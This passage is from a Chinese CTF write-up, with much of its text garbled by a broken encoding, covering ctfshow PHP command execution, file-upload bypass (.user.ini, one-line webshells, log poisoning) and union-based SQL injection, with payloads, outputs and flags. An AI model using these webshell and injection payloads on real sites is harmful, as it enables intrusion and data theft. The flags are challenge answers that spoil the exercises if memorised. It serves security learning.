punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    </pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><pre><code>v1è¦ä¸ºæ•°å­—ï¼Œv2æ˜¯æŒ‡ä»¤ï¼Œv3å¿…é¡»å«;

payload:
?v1=1&amp;v2=system('cat ctfshow.php')/*&amp;v3=*/;
</code></pre><h1 id="æ–‡ä»¶ä¸Šä¼ "><a class="anchor" href="#æ–‡ä»¶ä¸Šä¼ ">#</a> æ–‡ä»¶ä¸Šä¼ </h1><h2 id="web151"><a class="anchor" href="#web151">#</a> web151</h2><p><strong>åç«¯æ— éªŒè¯</strong></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211151823184.png" alt="image-20230211151823184"></p><p>æ–¹æ³•ä¸€ï¼šburpsuite æŠ“åŒ…æ”¹æ•°æ®</p><p>æ–¹æ³•äºŒï¼šF12 ç›´æ¥æ”¹æºç ï¼Œå› ä¸ºæ ¡éªŒæ ¼å¼å†™åœ¨ html é‡Œ</p><pre><code>payloadï¼š
è®¿é—®url/upload/é©¬
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;99531efd-02ea-410f-92a0-7d4e6a037b4a&#125;
</code></pre><h2 id="web152"><a class="anchor" href="#web152">#</a> web152</h2><p><strong>åç«¯æ–‡ä»¶ç±»å‹éªŒè¯</strong></p><p>åç«¯ä¸èƒ½å•ä¸€æ ¡éªŒ</p><p>åç«¯æ ¡éªŒè¦ä¸¥å¯†</p><p>è¿™ä¸€æ¬¡ä¸èƒ½ç›´æ¥åœ¨å‰ç«¯æ”¹ä»£ç </p><p>&lt;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œå¤±è´¥åŸå› ï¼šæ–‡ä»¶ç±»å‹ä¸åˆè§„&gt;</p><p>æˆ‘ä»¬ä¸Šä¼  png é©¬ç„¶åæŠ“åŒ…å† burpsuite é‡Œé¢æ”¹ php å³å¯ç»•è¿‡</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211160045055.png" alt="image-20230211160045055"></p><pre><code>payloadï¼š
è®¿é—®url/upload/é©¬
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;0b8b4699-360f-4d06-976c-b26d21986107&#125;
</code></pre><h2 id="web153"><a class="anchor" href="#web153">#</a> web153</h2><p><strong>é…ç½®æ–‡ä»¶å¯æ§</strong></p><p>åç«¯æ ¡éªŒè¦ä¸¥å¯†</p><p>æ–°çŸ¥è¯† user.ini</p><p>å…ˆå°†å‰ç«¯å†…å®¹æ ¼å¼è¿›è¡Œä¿®æ”¹</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211165314539.png" alt="image-20230211165314539"></p><p>ç„¶åä¸Šä¼  user.ini æ–‡ä»¶</p><pre><code>auto_append_file=1.txt
</code></pre><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211165437254.png" alt="image-20230211165437254"></p><p>åœ¨ user.ini å‰é¢åŠ ä¸€ä¸ª.</p><p>å†ä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º image/png å³å¯ç»•è¿‡ä¸Šä¼ æˆåŠŸ</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211165543326.png" alt="image-20230211165543326"></p><p>å†ç¼–è¾‘ä¸Šä¼ ä¸€ä¸ª 1.txt ä¸€å¥è¯æœ¨é©¬ï¼Œå³å¯å®ç°å‘½ä»¤æ‰§è¡Œ</p><pre><code>payloadï¼š
è®¿é—®url/upload/é©¬
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;f3e53e55-a523-417f-973c-0cb03629f560&#125;
</code></pre><h2 id="web154"><a class="anchor" href="#web154">#</a> web154</h2><p><strong>æ–‡ä»¶é­”æœ¯å­—èŠ‚æ¬ºéª—</strong></p><p>åç«¯ä¸èƒ½å•äºŒæ ¡éªŒ</p><p>å¯¹ php è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ–°çŸ¥è¯† php çŸ­æ ‡ç­¾</p><p>åŒæ ·ä¸Šä¼  user.ini</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230211170837109.png" alt="image-20230211170837109"></p><pre><code>payloadï¼š
è®¿é—®url/upload/é©¬
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;4cfa78ac-da71-4507-adb5-e0760adced07&#125;
</code></pre><h2 id="web155"><a class="anchor" href="#web155">#</a> web155</h2><p><strong>é…ç½®æ–‡ä»¶å¯æ§</strong></p><p>åç«¯ä¸èƒ½å•ä¸‰æ ¡éªŒ</p><p>åŒæ ·å¯¹ php è¿›è¡Œè¿‡æ»¤ï¼Œä¹Ÿå¯¹æ–‡ä»¶ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼Œç»§ç»­ç”¨çŸ­æ ‡ç­¾ç»•è¿‡å³å¯</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214105947584.png" alt="image-20230214105947584"></p><pre><code>payloadï¼š
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;c161ced9-ccda-483f-8c8e-2795f038f0b3&#125;
</code></pre><h2 id="web156"><a class="anchor" href="#web156">#</a> web156</h2><p>åç«¯ä¸èƒ½å•å››æ ¡éªŒ</p><p>æ–‡ä»¶å†…å®¹æ£€æµ‹ [] è¿‡æ»¤ï¼Œ{} ç»•è¿‡å³å¯</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214111055211.png" alt="image-20230214111055211"></p><pre><code>payloadï¼š
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;b74d2930-b4f8-4e42-9753-1a62cfa4a5f6&#125;
</code></pre><h2 id="web157"><a class="anchor" href="#web157">#</a> web157</h2><p>åç«¯ä¸èƒ½å•äº”æ ¡éªŒ</p><p>æ–°çŸ¥è¯†ï¼Œ[] å’Œ {} å’Œï¼›éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™æ—¶ç”¨åˆ° array_pop () å‡½æ•°ï¼Œåˆ†å·å¯ä»¥çœç•¥</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214113617915.png" alt="image-20230214113617915"></p><pre><code>payload:
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;d474a4cf-72c0-4ba4-b675-6a39e9996ab5&#125;
</code></pre><h2 id="web158"><a class="anchor" href="#web158">#</a> web158</h2><p>åç«¯ä¸èƒ½å•å…­æ ¡éªŒ</p><p>è¿‡æ»¤äº†æ—¥å¿—åŒ…å«</p><p>åŒæ ·èƒ½ç”¨ä¸Šé¢˜æ–¹å¼è§£</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214113617915.png" alt="image-20230214113617915"></p><pre><code>payload:
a=system('tac ../flag.php');
</code></pre><pre><code>ctfshow&#123;f5e1cc4e-c6f8-4041-9978-b9f3d516e5cc&#125;
</code></pre><h2 id="web159"><a class="anchor" href="#web159">#</a> web159</h2><p>æ–¹æ³•ä¸€ï¼š</p><p>ä¸Šä¼  user.ini</p><p>ç”¨åå¼•å·ç»•è¿‡</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214120916212.png" alt="image-20230214120916212"></p><p>ç›´æ¥è®¿é—® upload å³å¯å¾—åˆ° flag</p><p>æ–¹æ³•äºŒï¼š</p><p>æ—¥å¿—åŒ…å«æ¼æ´ç»•è¿‡</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214122305098.png" alt="image-20230214122305098"></p><p>è®¿é—® upload ä¸€æ¬¡å‘ç°åŒ…å«æˆåŠŸï¼Œç„¶å hackbar æ—¥å¿—æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåœ¨ User Agent è¾“å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214160702690.png" alt="image-20230214160702690"></p><p>ç›´æ¥å¾—å‡º flagï¼ˆæˆ‘è¿™é‡Œæ²¡è¯•å‡º flagï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å“ªä¸å¯¹ï¼Œä½†æ–¹æ³•æ˜¯æ²¡é”™çš„ï¼‰</p><p>#è¡¥å……ï¼šä¹‹åææ˜ç™½äº†å“ªé‡Œä¸å¯¹ï¼Œå› ä¸º upload åé¢å¿˜è®°åŠ ä¸ªæ–œçº¿ï¼Œå¯¼è‡´ç½‘é¡µåœ¨ upload å¯»æ‰¾ä¸€å¥è¯æœ¨é©¬æ²¡æ‰¾åˆ°æ‰€ä»¥æŠ¥ 301ï¼ŒåŠ ä¸ªæ–œçº¿è¡¨ç¤ºåœ¨ä¸‹ä¸€ä¸ªç›®å½•é‡Œï¼Œè¿™æ ·å°±å¯¹äº†</p><pre><code>ctfshow&#123;b11deff1-c608-42de-ad9c-cfbc73b451c5&#125;
</code></pre><h2 id="web160"><a class="anchor" href="#web160">#</a> web160</h2><p>è¿‡æ»¤äº† phpï¼Œæ‰§è¡Œå‡½æ•°ï¼Œåå¼•å·ï¼Œç©ºæ ¼ç­‰</p><p>åŒæ ·æ—¥å¿—åŒ…å«æ¼æ´å³å¯</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214144624269.png" alt="image-20230214144624269"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214144612304.png" alt="image-20230214144612304"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214144640074.png" alt="image-20230214144640074"></p><pre><code>ctfshow&#123;a2c7d477-51f5-401e-b249-3c863ba0ce91&#125;
</code></pre><h2 id="web161"><a class="anchor" href="#web161">#</a> web161</h2><p>åŒæ ·çš„çŸ¥è¯†ï¼Œè¿™ä¸€æ¬¡åŠ äº† GIF89a æ–‡ä»¶å¤´çš„åˆ¤æ–­</p><p>ç”¨ä¸Šä¸€é¢˜çš„æ€è·¯å³å¯ï¼Œè¿™é‡Œæˆ‘ç”¨èšå‰‘è¿æ¥å¾—åˆ°äº† flag</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214160139556.png" alt="image-20230214160139556"></p><pre><code>ctfshow&#123;9a01b080-c26d-43c3-a15a-0e4070b40869&#125;
</code></pre><h2 id="web166"><a class="anchor" href="#web166">#</a> web166</h2><p>åªå…è®¸ zip ä¸Šä¼ </p><pre><code>æ³¨æ„ï¼šæœ‰æ—¶å€™ä¼šå‡ºé”™ï¼Œæ˜¯å› ä¸º 
è¦æ”¹ä¸€ä¸‹MIMEç±»å‹ï¼šContent-Type: application/zip 
éœ€è¦ä¿®æ”¹æˆï¼šContent-Type: application/x-zip-compressed
</code></pre><h2 id="web168"><a class="anchor" href="#web168">#</a> web168</h2><p>åŸºç¡€å…æ€</p><p>ä¸Šä¼ ä¸€ä¸ªæ™®é€šå›¾ç‰‡ï¼Œå‘ç°ä»–ä¿å­˜åœ¨æœ¬åœ°ç›®å½•äº†</p><p>æŠ“åŒ…</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214162516394.png" alt="image-20230214162516394"></p><pre><code>ctfshow&#123;78a76ccd-0c66-43f4-8498-ae629e44df88&#125;
</code></pre><h2 id="web169"><a class="anchor" href="#web169">#</a> web169</h2><p>é«˜çº§å…æ€</p><p>æœ‰ç‚¹å°å‘ï¼Œå‰ç«¯åšäº†æ ¡éªŒåªèƒ½ä¼  zip æ–‡ä»¶ï¼Œåç«¯åˆåšäº†å›¾ç‰‡æ–‡ä»¶æ£€æŸ¥.<br>è¿‡æ»¤äº† <code>&lt;&gt;</code> å’Œ <code>php</code> , å¯ä»¥ä¸Šä¼ é…ç½®æ–‡ä»¶ç»•è¿‡</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214180009668.png" alt="image-20230214180009668"></p><p>åœ¨æ–‡ä»¶å¤´å†™ä¸ªä¸€å¥è¯æœ¨é©¬</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214180035758.png" alt="image-20230214180035758"></p><p>ç„¶åèšå‰‘è¿æˆ–ç›´æ¥ rce (å‘½ä»¤æ‰§è¡Œ) å³å¯</p><pre><code>ctfshow&#123;a2456e0d-217a-4514-8e13-d1a065544b01&#125;
</code></pre><h2 id="web170"><a class="anchor" href="#web170">#</a> web170</h2><p>ç»ˆæå…æ€</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230214181242486.png" alt="image-20230214181242486"></p><p>è¿‡æ»¤äº†è¿™ä¹ˆå¤šï¼Œä½†æ˜¯ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•åŒè§£</p><pre><code>ctfshow&#123;28168a35-e410-412b-b906-1e49290460a5&#125;
</code></pre><h1 id="sqlæ³¨å…¥"><a class="anchor" href="#sqlæ³¨å…¥">#</a> SQL æ³¨å…¥</h1><h2 id="web171"><a class="anchor" href="#web171">#</a> web171</h2><p>è¿™é‡Œä¼šæŠŠè¾“å…¥çš„ id ä»¥ get çš„å½¢å¼ç›´æ¥é€’äº¤åˆ°åå°å’ŒæŸ¥è¯¢è¯­å¥è¿›è¡Œç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥çš„è¿‡ç¨‹ï¼ŒåŒæ—¶æ ¹æ®è¿™ä¸ªé¢˜ç›®çš„æŸ¥è¯¢æ¡ä»¶ï¼Œå¯ä»¥çŒœæµ‹ username ä¸ºä¸º flag çš„ç”¨æˆ·ä»–çš„ä¿¡æ¯å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ï¼Œä½†æ˜¯ç½‘é¡µä¸­ 24 ä¸ªç”¨æˆ·å¹¶æ²¡æœ‰æˆ‘ä»¬æ‰€éœ€è¦çš„ flagï¼Œé¦–å…ˆæˆ‘ä»¬ç»™å‰é¢ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ä¸€ä¸ªä¸å¯èƒ½è¾¾æˆçš„æ¡ä»¶å»æˆªæ–­å®ƒï¼Œå³ - 1'ï¼Œç„¶åç”¨ or åŠ ä¸Šæˆ‘ä»¬æ‰€è¦æŸ¥è¯¢çš„ or username = 'flag'. æˆ‘ä»¬è¯­å¥å¤–é¢è¿˜æœ‰ä¸€ä¸ªå¼•å·ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸è¦æœ€åä¸€ä¸ªå¼•å·</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206132457461.png" alt="image-20230206132457461"></p><pre><code>payload:
-1' or username = 'flag

payload2:
id=1'or'1'='1
</code></pre><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206132649276.png" alt="image-20230206132649276"></p><pre><code>ctfshow&#123;5680eb72-ef35-46b9-8c45-c504e6eb5e86&#125;
</code></pre><h2 id="web172"><a class="anchor" href="#web172">#</a> web172</h2><p>é¦–å…ˆçœ‹åˆ°è¿™ä¸ªç•Œé¢ï¼Œè€è§„çŸ©ï¼Œæ£€æŸ¥æºä»£ç ï¼Œåœ¨åº•éƒ¨å‘ç° select.js</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206132949239.png" alt="image-20230206132949239"></p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>layui<span class="token punctuation">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string">'table'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&#123;</pre></td></tr><tr><td data-num="2"></td><td><pre>  var <span class="token keyword">table</span> <span class="token operator">=</span> layui<span class="token punctuation">.</span><span class="token keyword">table</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">table</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span>&#123;</pre></td></tr><tr><td data-num="4"></td><td><pre>    elem: <span class="token string">'#user'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">,</span>id:<span class="token string">'user_table'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">,</span>title: <span class="token string">'Ã§â€Â¨Ã¦Ë†Â·Ã¥Ë†â€”Ã¨Â¡Â¨'</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">,</span>height: <span class="token number">500</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">,</span>page:<span class="token boolean">true</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">,</span>url:<span class="token string">"api/"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">,</span>cols: <span class="token punctuation">[</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      &#123;field: <span class="token string">'id'</span><span class="token punctuation">,</span> title: <span class="token string">'ID'</span><span class="token punctuation">,</span> sort: <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token keyword">fixed</span>: <span class="token string">'left'</span>&#125;</pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token punctuation">,</span>&#123;field: <span class="token string">'username'</span><span class="token punctuation">,</span> title: <span class="token string">'Ã§â€Â¨Ã¦Ë†Â·Ã¥ÂÂ'</span>&#125;</pre></td></tr><tr><td data-num="13"></td><td><pre>      <span class="token punctuation">,</span>&#123;field: <span class="token string">'password'</span><span class="token punctuation">,</span> title: <span class="token string">'Ã¥Â¯â€ Ã§ Â'</span><span class="token punctuation">,</span>edit:<span class="token string">'text'</span>&#125;</pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">]</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  &#125;<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">table</span><span class="token punctuation">.</span><span class="token keyword">on</span><span class="token punctuation">(</span><span class="token string">'toolbar(user-filter)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>&#123;</pre></td></tr><tr><td data-num="17"></td><td><pre>  var checkStatus <span class="token operator">=</span> <span class="token keyword">table</span><span class="token punctuation">.</span>checkStatus<span class="token punctuation">(</span>obj<span class="token punctuation">.</span>config<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  switch<span class="token punctuation">(</span>obj<span class="token punctuation">.</span>event<span class="token punctuation">)</span>&#123;</pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">case</span> <span class="token string">'add'</span>:</pre></td></tr><tr><td data-num="20"></td><td><pre>      layer<span class="token punctuation">.</span>msg<span class="token punctuation">(</span><span class="token string">'Ã¦Â·Â»Ã¥Å  '</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">case</span> <span class="token string">'delete'</span>:</pre></td></tr><tr><td data-num="23"></td><td><pre>      layer<span class="token punctuation">.</span>msg<span class="token punctuation">(</span><span class="token string">'Ã¥Ë† Ã©â„¢Â¤'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">case</span> <span class="token string">'update'</span>:</pre></td></tr><tr><td data-num="26"></td><td><pre>      layer<span class="token punctuation">.</span>msg<span class="token punctuation">(</span><span class="token string">'Ã¦â€ºÂ´Ã¦â€“Â°'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  &#125;<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>layui<span class="token punctuation">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string">'element'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&#123;</pre></td></tr><tr><td data-num="33"></td><td><pre>  var element <span class="token operator">=</span> layui<span class="token punctuation">.</span>element<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  element<span class="token punctuation">.</span><span class="token keyword">on</span><span class="token punctuation">(</span><span class="token string">'tab(nav)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>&#123;</pre></td></tr><tr><td data-num="35"></td><td><pre>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  &#125;<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>layui<span class="token punctuation">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&#123;</pre></td></tr><tr><td data-num="40"></td><td><pre>  var form <span class="token operator">=</span> layui<span class="token punctuation">.</span>form<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>  form<span class="token punctuation">.</span><span class="token keyword">on</span><span class="token punctuation">(</span><span class="token string">'submit(*)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span>&#123;</pre></td></tr><tr><td data-num="42"></td><td><pre>    var id <span class="token operator">=</span> <span class="token keyword">data</span><span class="token punctuation">.</span>field<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    var <span class="token keyword">table</span> <span class="token operator">=</span> layui<span class="token punctuation">.</span><span class="token keyword">table</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">table</span><span class="token punctuation">.</span>reload<span class="token punctuation">(</span><span class="token string">'user_table'</span><span class="token punctuation">,</span> &#123;</pre></td></tr><tr><td data-num="45"></td><td><pre>      url:<span class="token string">'api/?id='</span><span class="token operator">+</span>id</pre></td></tr><tr><td data-num="46"></td><td><pre>    &#125;<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">//Ã©ËœÂ»Ã¦Â­Â¢Ã¨Â¡Â¨Ã¥Ââ€¢Ã¨Â·Â³Ã¨Â½Â¬Ã£â‚¬â€šÃ¥Â¦â€šÃ¦Å¾Å“Ã©Å“â‚¬Ã¨Â¦ÂÃ¨Â¡Â¨Ã¥Ââ€¢Ã¨Â·Â³Ã¨Â½Â¬Ã¯Â¼Å’Ã¥Å½Â»Ã¦Å½â€°Ã¨Â¿â„¢Ã¦Â®ÂµÃ¥ÂÂ³Ã¥ÂÂ¯Ã£â‚¬â€š</span></pre></td></tr><tr><td data-num="48"></td><td><pre>  &#125;<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>æ£€æŸ¥äº†ä¸€ä¸‹å‘ç° url éœ€è¦åœ¨ /api ä¸‹æŸ¥è¯¢</p><p>id=1'order by 1%23</p><p>å‘ç°ä»–æœ‰ååº”ï¼Œåˆ°ç¬¬å››åˆ—å°±æ²¡äº†ï¼Œè¯´æ˜åªæœ‰ä¸‰åˆ—</p><p>id=1'order by 3%23</p><figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>&#123;<span class="token string">"code"</span>:<span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"msg"</span>:<span class="token string">"\u67e5\u8be2\u6210\u529f"</span><span class="token punctuation">,</span><span class="token string">"count"</span>:<span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"data"</span>:<span class="token punctuation">[</span>&#123;<span class="token string">"id"</span>:<span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"username"</span>:<span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span>:<span class="token string">"admin"</span>&#125;<span class="token punctuation">]</span>&#125;</pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯è”åˆæŸ¥è¯¢æ•°æ®åº“</p><p>id=1'union select 1,2,3%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;2&quot;,&quot;password&quot;:&quot;3&quot;&#125;]&#125;
</code></pre><p>id=1'union select 1,2,database()%23</p><p>ç°åœ¨çŸ¥é“äº†æ•°æ®åº“å</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;2&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>æ¥ä¸‹æ¥</p><p>id=1'union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;information_schema,test,mysql,performance_schema,ctfshow_web&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>æ¥ä¸‹æ¥æŸ¥è¯¢è¡¨</p><p>1'union select 1,(select group_concat(table_name) from information_schema.columns where table_schema='ctfshow_web'),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow_user,ctfshow_user,ctfshow_user,ctfshow_user2,ctfshow_user2,ctfshow_user2&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>å‘ç°æœ‰ä¸ª ctfshow_userã€ctfshow_user2 è¡¨</p><p>æ¥ä¸‹æ¥å°±æ˜¯çˆ†å‡ºå­—æ®µ</p><p>id=1'union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;id,username,password&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>å‘ç°æœ‰ idã€usernameã€password ä¸‰åˆ—</p><p>ç„¶åå°±æ˜¯æŸ¥çœ‹å­—æ®µå†…å®¹</p><p>1'union select 1,(select group_concat(password) from ctfshow_user),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,flag_not_here&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
